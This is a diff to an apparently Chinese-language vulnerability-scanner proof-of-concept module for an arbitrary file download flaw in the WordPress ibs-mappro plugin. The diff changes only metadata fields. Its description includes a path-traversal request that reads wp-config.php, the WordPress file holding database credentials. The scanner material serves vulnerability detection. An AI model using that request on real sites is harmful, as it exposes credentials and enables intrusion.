@@ -4,18 +4,18 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0025' # 平台漏洞编号，留空
+    poc_id = 'a9f2d9b1-81c9-4e59-a684-cd92c1560508'
     name = 'WordPress ibs-mappro Plugin Arbitrary File Download Vulnerability'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
         WordPress ibs-mappro Plugin Arbitrary File Download Vulnerability.
         /wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress ibs-mappro Plugin'  # 漏洞应用版本
 
